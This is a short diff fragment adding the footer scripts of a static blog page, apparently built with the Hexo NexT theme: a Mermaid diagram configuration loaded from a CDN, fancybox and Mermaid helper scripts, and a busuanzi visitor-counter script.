+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"neutral","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/10.9.0/mermaid.min.js","integrity":"sha256-stuqcu2FrjYCXDOytWFA5SoUE/r3nkp6gTglzNSlavU="}}</script>
+  <script src="/js/third-party/tags/mermaid.js"></script>
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
